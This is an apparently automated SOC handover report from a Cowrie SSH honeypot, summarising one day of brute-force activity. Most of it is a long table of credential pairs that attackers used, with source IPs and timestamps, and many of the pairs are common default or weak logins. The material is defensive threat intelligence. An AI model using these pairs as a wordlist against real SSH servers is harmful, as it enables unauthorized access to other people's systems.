# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-06 |
| **Generated At** | 2026-07-06T13:51:25Z |
| **Shift Time** | 13:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **987** |
| Confirmed Threats | **979** |
| False Positives Filtered | **8** (0.8%) |
| Unique Attacker IPs | **107** |
| Countries of Origin | **27** |
| High Severity Cases | **419** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **568** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **480** |
| Unique Credential Pairs | **281** |
| Unique Usernames | **94** |
| Unique Passwords | **222** |
| Successful Auth Pairs | **392** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 199 |
| `support` | 41 |
| `345gs5662d34` | 36 |
| `admin` | 27 |
| `ubuntu` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 40 |
| `3245gs5662d34` | 37 |
| `345gs5662d34` | 36 |
| `123456` | 26 |
| `admin` | 19 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 40 |
| `345gs5662d34` | `345gs5662d34` | 36 |
| `root` | `3245gs5662d34` | 25 |
| `admin` | `admin` | 16 |
| `root` | `LeitboGi0ro` | 10 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `111111` | `2.57.122.209` | 2026-07-06T06:57:02 |
| `admin` | `admin` | `157.173.104.13` | 2026-07-06T06:58:00 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-06T06:58:02 |
| `root` | `1029384756` | `45.198.224.120` | 2026-07-06T06:58:24 |
| `root` | `Pass@123456` | `10.0.0.73` | 2026-07-06T06:58:40 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-06T06:59:51 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-06T06:59:51 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-06T06:59:53 |
| `root` | `123` | `2.57.122.209` | 2026-07-06T07:00:04 |
| `support` | `support` | `176.53.159.196` | 2026-07-06T07:02:36 |
| `support` | `support` | `10.0.0.73` | 2026-07-06T07:02:52 |
| `root` | `123123` | `2.57.122.209` | 2026-07-06T07:03:04 |
| `root` | `123321` | `2.57.122.209` | 2026-07-06T07:05:59 |
| `root` | `1234` | `2.57.122.209` | 2026-07-06T07:08:50 |
| `ubuntu` | `hadoop` | `187.212.1.182` | 2026-07-06T07:10:39 |
| `345gs5662d34` | `345gs5662d34` | `187.212.1.182` | 2026-07-06T07:10:41 |
| `ubuntu` | `3245gs5662d34` | `187.212.1.182` | 2026-07-06T07:10:42 |
| `mythtv` | `mythtv` | `45.198.224.120` | 2026-07-06T07:11:12 |
| `root` | `12345` | `2.57.122.209` | 2026-07-06T07:11:26 |
| `root` | `vanilla` | `104.243.42.167` | 2026-07-06T07:14:35 |
| `345gs5662d34` | `345gs5662d34` | `104.243.42.167` | 2026-07-06T07:14:37 |
| `root` | `3245gs5662d34` | `104.243.42.167` | 2026-07-06T07:14:37 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-06T07:16:20 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.97.43` | 2026-07-06T07:16:36 |
| `*1` | `$4` | `34.77.97.43` | 2026-07-06T07:16:44 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7332` | `34.77.97.43` | 2026-07-06T07:16:46 |
| `root` | `1234567` | `2.57.122.209` | 2026-07-06T07:16:59 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-06T07:18:07 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-06T07:18:07 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-06T07:18:28 |
| `root` | `12345678` | `2.57.122.209` | 2026-07-06T07:19:15 |
| `root` | `123456789` | `2.57.122.209` | 2026-07-06T07:21:57 |
| `root` | `QWEqwe!@#` | `45.198.224.120` | 2026-07-06T07:23:58 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-06T07:25:00 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-06T07:25:00 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-06T07:25:09 |
| `ubuntu` | `Admin` | `45.198.224.120` | 2026-07-06T07:36:40 |
| `root` | `woai1314` | `45.94.68.69` | 2026-07-06T07:37:35 |
| `345gs5662d34` | `345gs5662d34` | `45.94.68.69` | 2026-07-06T07:37:39 |
| `root` | `3245gs5662d34` | `45.94.68.69` | 2026-07-06T07:37:40 |
| `yjq` | `123456` | `2.58.172.185` | 2026-07-06T07:47:22 |
| `oracle` | `12345a` | `45.198.224.120` | 2026-07-06T07:49:27 |
| `john` | `john123` | `185.242.3.195` | 2026-07-06T07:50:21 |
| `vhserver` | `123` | `103.82.92.50` | 2026-07-06T07:51:29 |
| `345gs5662d34` | `345gs5662d34` | `103.82.92.50` | 2026-07-06T07:51:34 |
| `vhserver` | `3245gs5662d34` | `103.82.92.50` | 2026-07-06T07:51:36 |
| `root` | `a2525775` | `57.128.225.99` | 2026-07-06T07:56:06 |
| `345gs5662d34` | `345gs5662d34` | `57.128.225.99` | 2026-07-06T07:56:08 |
| `root` | `3245gs5662d34` | `57.128.225.99` | 2026-07-06T07:56:09 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.187.0` | 2026-07-06T08:01:18 |
| `root` | `root123...` | `189.203.163.10` | 2026-07-06T08:01:24 |
| `345gs5662d34` | `345gs5662d34` | `189.203.163.10` | 2026-07-06T08:01:26 |
| `root` | `3245gs5662d34` | `189.203.163.10` | 2026-07-06T08:01:26 |
| `*1` | `$4` | `34.53.187.0` | 2026-07-06T08:01:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6275` | `34.53.187.0` | 2026-07-06T08:01:33 |
| `root` | `qingshan@123` | `45.198.224.120` | 2026-07-06T08:02:09 |
| `root` | `a2525775` | `4.221.162.168` | 2026-07-06T08:07:54 |
| `345gs5662d34` | `345gs5662d34` | `4.221.162.168` | 2026-07-06T08:07:58 |
| `root` | `3245gs5662d34` | `4.221.162.168` | 2026-07-06T08:08:00 |
| `admin` | `admin` | `34.156.75.163` | 2026-07-06T08:09:39 |
| `ubuntu` | `1a2s3d` | `45.198.224.120` | 2026-07-06T08:14:46 |
| `controller` | `controller` | `45.198.224.120` | 2026-07-06T08:27:33 |
| `john` | `john123` | `10.0.0.73` | 2026-07-06T08:30:49 |
| `root` | `qwe123,.` | `45.198.224.120` | 2026-07-06T08:40:15 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.162.210` | 2026-07-06T08:40:52 |
| `*1` | `$4` | `34.156.162.210` | 2026-07-06T08:41:05 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 870` | `34.156.162.210` | 2026-07-06T08:41:07 |
| `root` | `Passwort2020` | `45.198.224.120` | 2026-07-06T08:52:50 |
| `root` | `Remote@OS` | `45.198.224.120` | 2026-07-06T09:05:13 |
| `ubuntu` | `!@#123` | `45.198.224.120` | 2026-07-06T09:17:42 |
| `michael` | `michael` | `185.242.3.195` | 2026-07-06T09:22:17 |
| `root` | `!Q2w3e4r` | `103.24.63.85` | 2026-07-06T09:25:06 |
| `pi` | `raspberry` | `103.24.63.85` | 2026-07-06T09:25:07 |
| `hive` | `hive` | `103.24.63.85` | 2026-07-06T09:25:08 |
| `git` | `git` | `103.24.63.85` | 2026-07-06T09:25:10 |
| `wang` | `wang123` | `103.24.63.85` | 2026-07-06T09:25:12 |
| `nginx` | `nginx` | `103.24.63.85` | 2026-07-06T09:25:13 |
| `mongo` | `123456` | `103.24.63.85` | 2026-07-06T09:25:15 |
| `user` | `111111` | `103.24.63.85` | 2026-07-06T09:25:16 |
| `oracle` | `oracle` | `103.24.63.85` | 2026-07-06T09:25:19 |
| `gpadmin` | `gpadmin123` | `103.24.63.85` | 2026-07-06T09:25:22 |
| `esroot` | `esroot` | `103.24.63.85` | 2026-07-06T09:25:22 |
| `gitlab` | `gitlab` | `103.24.63.85` | 2026-07-06T09:25:22 |
| `root` | `aA123456` | `103.24.63.85` | 2026-07-06T09:25:22 |
| `apache` | `apache123` | `103.24.63.85` | 2026-07-06T09:25:23 |
| `root` | `P@ssw0rd` | `103.24.63.85` | 2026-07-06T09:25:26 |
| `root` | `!qaz@WSX` | `103.24.63.85` | 2026-07-06T09:25:27 |
| `lighthouse` | `123456` | `103.24.63.85` | 2026-07-06T09:25:27 |
| `user` | `user` | `103.24.63.85` | 2026-07-06T09:25:30 |
| `flask` | `12345678` | `103.24.63.85` | 2026-07-06T09:25:30 |
| `hadoop` | `hadoop` | `103.24.63.85` | 2026-07-06T09:25:32 |
| `oracle` | `!QAZ@WSX` | `103.24.63.85` | 2026-07-06T09:25:32 |
| `test` | `1234qwer` | `103.24.63.85` | 2026-07-06T09:25:35 |
| `root` | `Aa123456` | `103.24.63.85` | 2026-07-06T09:25:37 |
| `developer` | `123456` | `103.24.63.85` | 2026-07-06T09:25:37 |
| `tom` | `123456` | `103.24.63.85` | 2026-07-06T09:25:43 |
| `oscar` | `oscar123` | `103.24.63.85` | 2026-07-06T09:25:44 |
| `root` | `Ab123456` | `103.24.63.85` | 2026-07-06T09:25:44 |
| `root` | `abc123` | `103.24.63.85` | 2026-07-06T09:25:44 |
| `user1` | `user1` | `103.24.63.85` | 2026-07-06T09:25:45 |
| `root` | `1qaz@wsx` | `103.24.63.85` | 2026-07-06T09:25:45 |
| `root` | `P@ssword` | `103.24.63.85` | 2026-07-06T09:25:48 |
| `root` | `qQ123456` | `103.24.63.85` | 2026-07-06T09:25:50 |
| `flink` | `flink` | `103.24.63.85` | 2026-07-06T09:25:51 |
| `apache` | `apache` | `103.24.63.85` | 2026-07-06T09:25:53 |
| `root` | `password` | `103.24.63.85` | 2026-07-06T09:25:53 |
| `user1` | `123456` | `103.24.63.85` | 2026-07-06T09:25:55 |
| `sonar` | `sonar123` | `103.24.63.85` | 2026-07-06T09:26:03 |
| `svnuser` | `123456` | `103.24.63.85` | 2026-07-06T09:26:03 |
| `lighthouse` | `lighthouse123` | `103.24.63.85` | 2026-07-06T09:26:03 |
| `root` | `admin` | `103.24.63.85` | 2026-07-06T09:26:07 |
| `esuser` | `123456` | `103.24.63.85` | 2026-07-06T09:26:07 |
| `root` | `Pa$$w0rd` | `103.24.63.85` | 2026-07-06T09:26:09 |
| `nginx` | `nginx123` | `103.24.63.85` | 2026-07-06T09:26:29 |
| `gpadmin` | `gpadmin` | `103.24.63.85` | 2026-07-06T09:26:30 |
| `oracle` | `qwe123` | `103.24.63.85` | 2026-07-06T09:26:31 |
| `rancher` | `rancher123` | `103.24.63.85` | 2026-07-06T09:26:32 |
| `root` | `Root9999` | `198.23.232.146` | 2026-07-06T09:26:32 |
| `345gs5662d34` | `345gs5662d34` | `198.23.232.146` | 2026-07-06T09:26:34 |
| `root` | `3245gs5662d34` | `198.23.232.146` | 2026-07-06T09:26:35 |
| `nvidia` | `nvidia` | `77.90.185.20` | 2026-07-06T09:26:35 |
| `worker` | `worker` | `103.24.63.85` | 2026-07-06T09:27:00 |
| `elsearch` | `elsearch` | `103.24.63.85` | 2026-07-06T09:27:00 |
| `testuser` | `testuser` | `103.24.63.85` | 2026-07-06T09:27:10 |
| `postgres` | `postgres` | `103.24.63.85` | 2026-07-06T09:27:12 |
| `root` | `!Q@W3e4r` | `103.24.63.85` | 2026-07-06T09:27:13 |
| `centos` | `centos` | `103.24.63.85` | 2026-07-06T09:27:14 |
| `tomcat` | `tomcat123` | `103.24.63.85` | 2026-07-06T09:27:16 |
| `mysql` | `mysql` | `103.24.63.85` | 2026-07-06T09:27:17 |
| `root` | `P@55w0rd` | `103.24.63.85` | 2026-07-06T09:27:18 |
| `root` | `1234567890` | `103.24.63.85` | 2026-07-06T09:27:19 |
| `zabbix` | `zabbix` | `103.24.63.85` | 2026-07-06T09:27:20 |
| `hadoop` | `123` | `103.24.63.85` | 2026-07-06T09:27:22 |
| `debianuser` | `1qazXSW@` | `103.24.63.85` | 2026-07-06T09:27:24 |
| `ranger` | `ranger` | `103.24.63.85` | 2026-07-06T09:27:26 |
| `admin` | `admin` | `103.24.63.85` | 2026-07-06T09:27:30 |
| `gitlab` | `gitlab123` | `103.24.63.85` | 2026-07-06T09:27:33 |
| `root` | `!Qaz@Wsx` | `103.24.63.85` | 2026-07-06T09:27:34 |
| `hadoop` | `123456` | `103.24.63.85` | 2026-07-06T09:27:36 |
| `tools` | `tools123` | `103.24.63.85` | 2026-07-06T09:27:37 |
| `admin` | `1234` | `103.24.63.85` | 2026-07-06T09:27:38 |
| `root` | `QWERTY123` | `103.24.63.85` | 2026-07-06T09:27:40 |
| `root` | `12345` | `103.24.63.85` | 2026-07-06T09:27:40 |
| `root` | `Password1` | `103.24.63.85` | 2026-07-06T09:27:43 |
| `oracle` | `1qaz@WSX` | `103.24.63.85` | 2026-07-06T09:27:44 |
| `flink` | `flink123` | `103.24.63.85` | 2026-07-06T09:27:47 |
| `gitlab-runner` | `gitlab-runner` | `103.24.63.85` | 2026-07-06T09:27:47 |
| `es` | `es123456` | `103.24.63.85` | 2026-07-06T09:27:48 |
| `oracle` | `123456` | `103.24.63.85` | 2026-07-06T09:27:50 |
| `ubnt` | `ubnt` | `103.24.63.85` | 2026-07-06T09:27:50 |
| `root` | `AA123456` | `103.24.63.85` | 2026-07-06T09:27:53 |
| `ftp` | `123456` | `103.24.63.85` | 2026-07-06T09:27:56 |
| `mongodb` | `mongodb` | `103.24.63.85` | 2026-07-06T09:27:58 |
| `www` | `123456` | `103.24.63.85` | 2026-07-06T09:28:01 |
| `sonar` | `sonar` | `103.24.63.85` | 2026-07-06T09:28:02 |
| `elasticsearch` | `elasticsearch` | `103.24.63.85` | 2026-07-06T09:28:04 |
| `docker` | `docker123` | `103.24.63.85` | 2026-07-06T09:28:04 |
| `root` | `123` | `103.24.63.85` | 2026-07-06T09:28:06 |
| `dev` | `dev123456` | `103.24.63.85` | 2026-07-06T09:28:07 |
| `elsearch` | `123456` | `103.24.63.85` | 2026-07-06T09:28:10 |
| `vagrant` | `vagrant` | `103.24.63.85` | 2026-07-06T09:28:12 |
| `ftpuser` | `ftpuser` | `103.24.63.85` | 2026-07-06T09:28:14 |
| `esuser` | `esuser123` | `103.24.63.85` | 2026-07-06T09:28:16 |
| `root` | `123321` | `103.24.63.85` | 2026-07-06T09:28:18 |
| `es` | `es` | `103.24.63.85` | 2026-07-06T09:28:22 |
| `root` | `1qaz@WSX` | `103.24.63.85` | 2026-07-06T09:28:23 |
| `demo` | `demo` | `103.24.63.85` | 2026-07-06T09:28:25 |
| `oscar` | `123456` | `103.24.63.85` | 2026-07-06T09:28:29 |
| `dolphinscheduler` | `dolphinscheduler123` | `103.24.63.85` | 2026-07-06T09:28:31 |
| `pi` | `pi` | `103.24.63.85` | 2026-07-06T09:28:31 |
| `lighthouse` | `lighthouse` | `103.24.63.85` | 2026-07-06T09:28:34 |
| `oceanbase` | `oceanbase` | `103.24.63.85` | 2026-07-06T09:28:34 |
| `root` | `a123456A` | `103.24.63.85` | 2026-07-06T09:28:37 |
| `root` | `Admin@123` | `103.24.63.85` | 2026-07-06T09:28:38 |
| `user` | `123456` | `103.24.63.85` | 2026-07-06T09:28:40 |
| `ubuntu` | `123456` | `103.24.63.85` | 2026-07-06T09:28:43 |
| `root` | `1qazxsw2` | `103.24.63.85` | 2026-07-06T09:28:47 |
| `root` | `toor` | `103.24.63.85` | 2026-07-06T09:28:50 |
| `root` | `111111` | `103.24.63.85` | 2026-07-06T09:28:57 |
| `root` | `A123456a` | `103.24.63.85` | 2026-07-06T09:29:00 |
| `ftp` | `ftp` | `103.24.63.85` | 2026-07-06T09:29:03 |
| `uftp` | `123456` | `103.24.63.85` | 2026-07-06T09:29:04 |
| `awsgui` | `awsgui` | `103.24.63.85` | 2026-07-06T09:29:05 |
| `root` | `passwd` | `103.24.63.85` | 2026-07-06T09:29:07 |
| `dolphinscheduler` | `dolphinscheduler` | `103.24.63.85` | 2026-07-06T09:29:07 |
| `test2` | `test2` | `103.24.63.85` | 2026-07-06T09:29:09 |
| `wang` | `wang` | `103.24.63.85` | 2026-07-06T09:29:12 |
| `guest` | `123456` | `103.24.63.85` | 2026-07-06T09:29:12 |
| `www` | `www123` | `103.24.63.85` | 2026-07-06T09:29:14 |
| `app` | `app` | `103.24.63.85` | 2026-07-06T09:29:16 |
| `nvidia` | `nvidia` | `103.24.63.85` | 2026-07-06T09:29:18 |
| `root` | `123456789` | `103.24.63.85` | 2026-07-06T09:29:20 |
| `es` | `es123` | `103.24.63.85` | 2026-07-06T09:29:21 |
| `sugi` | `sugi` | `103.24.63.85` | 2026-07-06T09:29:23 |
| `ghazaleh2` | `123456` | `45.198.224.120` | 2026-07-06T09:29:54 |
| `ubuntu` | `2wsx@WSX` | `158.220.83.77` | 2026-07-06T09:31:53 |
| `345gs5662d34` | `345gs5662d34` | `158.220.83.77` | 2026-07-06T09:31:55 |
| `ubuntu` | `3245gs5662d34` | `158.220.83.77` | 2026-07-06T09:31:56 |
| `nicole` | `nicole` | `45.198.224.120` | 2026-07-06T09:42:04 |
| `root` | `nasa` | `45.198.224.120` | 2026-07-06T09:54:10 |
| `michael` | `michael` | `10.0.0.73` | 2026-07-06T10:02:38 |
| `ubuntu` | `test123` | `45.198.224.120` | 2026-07-06T10:06:37 |
| `root` | `﻿------fuck------` | `219.151.148.162` | 2026-07-06T10:09:26 |
| `weblogic` | `test123` | `2.58.172.185` | 2026-07-06T10:12:11 |
| `root` | `qwe123QWE!@#` | `45.198.224.120` | 2026-07-06T10:19:02 |
| `root` | `gpadmin1234` | `49.204.74.149` | 2026-07-06T10:22:50 |
| `345gs5662d34` | `345gs5662d34` | `49.204.74.149` | 2026-07-06T10:22:54 |
| `root` | `3245gs5662d34` | `49.204.74.149` | 2026-07-06T10:22:55 |
| `root` | `---fuck_you----` | `120.27.128.176` | 2026-07-06T10:24:13 |
| `root` | `qazzxc` | `45.198.224.120` | 2026-07-06T10:31:16 |
| `root` | `Qaz96300` | `10.0.0.73` | 2026-07-06T10:32:46 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-06T10:32:50 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T10:32:52 |
| `etluser` | `etluser` | `43.155.40.91` | 2026-07-06T10:34:42 |
| `345gs5662d34` | `345gs5662d34` | `43.155.40.91` | 2026-07-06T10:34:46 |
| `etluser` | `3245gs5662d34` | `43.155.40.91` | 2026-07-06T10:34:48 |
| `root` | `asshole1` | `46.101.216.224` | 2026-07-06T10:37:20 |
| `345gs5662d34` | `345gs5662d34` | `46.101.216.224` | 2026-07-06T10:37:22 |
| `root` | `3245gs5662d34` | `46.101.216.224` | 2026-07-06T10:37:23 |
| `root` | `Zl123456789` | `10.0.0.73` | 2026-07-06T10:39:11 |
| `dev` | `123` | `10.0.0.73` | 2026-07-06T10:40:09 |
| `dev` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T10:40:14 |
| `root` | `admin!@#456` | `200.141.47.190` | 2026-07-06T10:43:15 |
| `345gs5662d34` | `345gs5662d34` | `200.141.47.190` | 2026-07-06T10:43:17 |
| `root` | `3245gs5662d34` | `200.141.47.190` | 2026-07-06T10:43:18 |
| `root` | `Root123@` | `45.198.224.120` | 2026-07-06T10:43:28 |
| `guest` | `Pr0NetWay` | `10.0.0.73` | 2026-07-06T10:45:31 |
| `guest` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T10:45:39 |
| `root` | `P4ssw0rd123` | `185.242.3.195` | 2026-07-06T10:54:12 |
| `web1` | `p@ssw0rd` | `45.198.224.120` | 2026-07-06T10:55:48 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `152.32.131.10` | 2026-07-06T10:58:23 |
| `root` | `root12#` | `118.194.229.94` | 2026-07-06T11:05:06 |
| `345gs5662d34` | `345gs5662d34` | `118.194.229.94` | 2026-07-06T11:05:10 |
| `root` | `3245gs5662d34` | `118.194.229.94` | 2026-07-06T11:05:11 |
| `root` | `Asd123Asd` | `152.53.0.56` | 2026-07-06T11:07:13 |
| `345gs5662d34` | `345gs5662d34` | `152.53.0.56` | 2026-07-06T11:07:16 |
| `root` | `3245gs5662d34` | `152.53.0.56` | 2026-07-06T11:07:17 |
| `root` | `qwe123.` | `45.198.224.120` | 2026-07-06T11:08:01 |
| `root` | `23452345` | `10.0.0.73` | 2026-07-06T11:08:28 |
| `root` | `ABCabc123!@#` | `10.0.0.73` | 2026-07-06T11:08:54 |
| `root` | `Password@321` | `202.184.156.3` | 2026-07-06T11:13:29 |
| `345gs5662d34` | `345gs5662d34` | `202.184.156.3` | 2026-07-06T11:13:33 |
| `root` | `3245gs5662d34` | `202.184.156.3` | 2026-07-06T11:13:35 |
| `root` | `2q3w4e5r` | `103.237.144.204` | 2026-07-06T11:15:07 |
| `345gs5662d34` | `345gs5662d34` | `103.237.144.204` | 2026-07-06T11:15:12 |
| `root` | `3245gs5662d34` | `103.237.144.204` | 2026-07-06T11:15:14 |
| `cs` | `cs` | `45.198.224.120` | 2026-07-06T11:20:14 |
| `root` | `123456789Ab` | `117.173.65.4` | 2026-07-06T11:24:13 |
| `root` | `cloud123$` | `117.173.65.4` | 2026-07-06T11:28:43 |
| `web` | `777777` | `45.198.224.120` | 2026-07-06T11:32:28 |
| `root` | `vpn2015` | `190.221.50.123` | 2026-07-06T11:33:37 |
| `345gs5662d34` | `345gs5662d34` | `190.221.50.123` | 2026-07-06T11:33:41 |
| `root` | `3245gs5662d34` | `190.221.50.123` | 2026-07-06T11:33:42 |
| `admin` | `abc12345` | `10.0.0.73` | 2026-07-06T11:33:58 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T11:34:01 |
| `test1` | `test1` | `91.92.40.176` | 2026-07-06T11:35:14 |
| `root` | `P4ssw0rd123` | `10.0.0.73` | 2026-07-06T11:35:15 |
| `root` | `vpn2015` | `87.106.44.172` | 2026-07-06T11:36:36 |
| `345gs5662d34` | `345gs5662d34` | `87.106.44.172` | 2026-07-06T11:36:38 |
| `root` | `3245gs5662d34` | `87.106.44.172` | 2026-07-06T11:36:39 |
| `test2` | `test2` | `91.92.40.176` | 2026-07-06T11:37:43 |
| `root` | `Azerty123@` | `213.21.248.43` | 2026-07-06T11:38:50 |
| `345gs5662d34` | `345gs5662d34` | `213.21.248.43` | 2026-07-06T11:38:52 |
| `root` | `3245gs5662d34` | `213.21.248.43` | 2026-07-06T11:38:53 |
| `test3` | `test3` | `91.92.40.176` | 2026-07-06T11:40:25 |
| `newuser` | `test123` | `201.249.192.30` | 2026-07-06T11:41:23 |
| `345gs5662d34` | `345gs5662d34` | `201.249.192.30` | 2026-07-06T11:41:26 |
| `newuser` | `3245gs5662d34` | `201.249.192.30` | 2026-07-06T11:41:26 |
| `root` | `satan` | `10.0.0.73` | 2026-07-06T11:41:59 |
| `root` | `root123` | `91.92.40.176` | 2026-07-06T11:42:53 |
| `root` | `India@123` | `45.198.224.120` | 2026-07-06T11:44:41 |
| `root` | `connect` | `220.88.220.59` | 2026-07-06T11:44:52 |
| `345gs5662d34` | `345gs5662d34` | `220.88.220.59` | 2026-07-06T11:44:56 |
| `root` | `3245gs5662d34` | `220.88.220.59` | 2026-07-06T11:44:57 |
| `root` | `root321` | `91.92.40.176` | 2026-07-06T11:45:16 |
| `ubuntu` | `1111` | `209.99.190.113` | 2026-07-06T11:45:47 |
| `345gs5662d34` | `345gs5662d34` | `209.99.190.113` | 2026-07-06T11:45:50 |
| `ubuntu` | `3245gs5662d34` | `209.99.190.113` | 2026-07-06T11:45:51 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-06T11:46:02 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-06T11:46:03 |
| `user` | `123qweQWE` | `47.250.52.158` | 2026-07-06T11:47:33 |
| `345gs5662d34` | `345gs5662d34` | `47.250.52.158` | 2026-07-06T11:47:37 |
| `user` | `3245gs5662d34` | `47.250.52.158` | 2026-07-06T11:47:39 |
| `root` | `123` | `91.92.40.176` | 2026-07-06T11:47:41 |
| `root` | `321` | `91.92.40.176` | 2026-07-06T11:50:04 |
| `root` | `pass` | `91.92.40.176` | 2026-07-06T11:51:56 |
| `root` | `qwerty` | `91.92.40.176` | 2026-07-06T11:53:54 |
| `root` | `password` | `91.92.40.176` | 2026-07-06T11:55:53 |
| `root` | `1` | `91.92.40.6` | 2026-07-06T11:56:19 |
| `root` | `P@ssw0rd123456` | `45.198.224.120` | 2026-07-06T11:56:52 |
| `root` | `12` | `91.92.40.6` | 2026-07-06T11:57:52 |
| `root` | `111111` | `91.92.40.176` | 2026-07-06T11:57:59 |
| `root` | `123` | `91.92.40.6` | 2026-07-06T11:59:28 |
| `postgres` | `postgres` | `91.92.40.176` | 2026-07-06T11:59:59 |
| `root` | `1234` | `91.92.40.6` | 2026-07-06T12:01:04 |
| `root` | `` | `188.64.139.147` | 2026-07-06T12:01:27 |
| `oracle` | `oracle` | `91.92.40.176` | 2026-07-06T12:02:00 |
| `root` | `12345` | `91.92.40.6` | 2026-07-06T12:02:38 |
| `user` | `user` | `91.92.40.176` | 2026-07-06T12:03:55 |
| `root` | `admin` | `154.90.70.254` | 2026-07-06T12:04:37 |
| `root` | `1234567` | `91.92.40.6` | 2026-07-06T12:05:44 |
| `wpyan` | `wpyan` | `91.92.40.176` | 2026-07-06T12:05:49 |
| `root` | `12345678` | `91.92.40.6` | 2026-07-06T12:07:14 |
| `jira` | `jira` | `91.92.40.176` | 2026-07-06T12:08:02 |
| `docker` | `1qaz2wsx` | `10.0.0.73` | 2026-07-06T12:08:24 |
| `docker` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T12:08:27 |
| `root` | `123456789` | `91.92.40.6` | 2026-07-06T12:08:45 |
| `root` | `Qwer@123456` | `45.198.224.120` | 2026-07-06T12:08:53 |
| `root` | `abcd@123456789` | `10.0.0.73` | 2026-07-06T12:09:07 |
| `root` | `1234567890` | `91.92.40.6` | 2026-07-06T12:10:17 |
| `vps` | `vps` | `91.92.40.176` | 2026-07-06T12:10:21 |
| `root` | `ubuntu` | `103.107.159.75` | 2026-07-06T12:11:05 |
| `root` | `123qwe` | `91.92.40.6` | 2026-07-06T12:11:46 |
| `uftp` | `uftp` | `91.92.40.176` | 2026-07-06T12:12:44 |
| `root` | `123qwerty` | `91.92.40.6` | 2026-07-06T12:13:17 |
| `root` | `21` | `91.92.40.6` | 2026-07-06T12:14:50 |
| `testuser` | `testuser` | `91.92.40.176` | 2026-07-06T12:15:05 |
| `root` | `321` | `91.92.40.6` | 2026-07-06T12:16:24 |
| `zhouh` | `zhouh` | `91.92.40.176` | 2026-07-06T12:17:28 |
| `root` | `4321` | `91.92.40.6` | 2026-07-06T12:17:54 |
| `root` | `54321` | `91.92.40.6` | 2026-07-06T12:19:25 |
| `pul` | `pul` | `91.92.40.176` | 2026-07-06T12:19:47 |
| `jianzhao` | `jianzhao` | `45.198.224.120` | 2026-07-06T12:20:39 |
| `root` | `654321` | `91.92.40.6` | 2026-07-06T12:20:56 |
| `yuanwd` | `yuanwd` | `91.92.40.176` | 2026-07-06T12:22:04 |
| `root` | `P4ssw0rd` | `91.92.40.6` | 2026-07-06T12:22:25 |
| `root` | `12345678` | `163.61.39.40` | 2026-07-06T12:22:28 |
| `root` | `1234567` | `163.61.39.40` | 2026-07-06T12:22:31 |
| `root` | `123456789` | `163.61.39.40` | 2026-07-06T12:22:34 |
| `root` | `1234567890` | `163.61.39.40` | 2026-07-06T12:22:37 |
| `root` | `test` | `163.61.39.40` | 2026-07-06T12:22:40 |
| `admin` | `123456789` | `163.61.39.40` | 2026-07-06T12:22:43 |
| `admin` | `12345678` | `163.61.39.40` | 2026-07-06T12:22:46 |
| `admin` | `1234567` | `163.61.39.40` | 2026-07-06T12:22:49 |
| `admin` | `test` | `163.61.39.40` | 2026-07-06T12:22:52 |
| `user` | `test` | `163.61.39.40` | 2026-07-06T12:22:55 |
| `user` | `123456` | `163.61.39.40` | 2026-07-06T12:22:58 |
| `user` | `12345678` | `163.61.39.40` | 2026-07-06T12:23:01 |
| `support` | `123456` | `163.61.39.40` | 2026-07-06T12:23:04 |
| `guest` | `123456` | `163.61.39.40` | 2026-07-06T12:23:07 |
| `test` | `test` | `163.61.39.40` | 2026-07-06T12:23:11 |
| `john` | `john` | `163.61.39.40` | 2026-07-06T12:23:13 |
| `root` | `toor` | `163.61.39.40` | 2026-07-06T12:23:17 |
| `root` | `root123456` | `163.61.39.40` | 2026-07-06T12:23:19 |
| `root` | `admin` | `163.61.39.40` | 2026-07-06T12:23:26 |
| `root` | `P4ssword` | `91.92.40.6` | 2026-07-06T12:23:55 |
| `server` | `server` | `91.92.40.176` | 2026-07-06T12:24:20 |
| `root` | `P@ssw0rd` | `91.92.40.6` | 2026-07-06T12:25:26 |
| `hadoop` | `hadoop` | `91.92.40.176` | 2026-07-06T12:26:43 |
| `root` | `Passw0rd` | `91.92.40.6` | 2026-07-06T12:26:56 |
| `root` | `starwars` | `185.242.3.195` | 2026-07-06T12:27:11 |
| `root` | `p4ssword` | `91.92.40.6` | 2026-07-06T12:28:27 |
| `git` | `git` | `91.92.40.176` | 2026-07-06T12:29:05 |
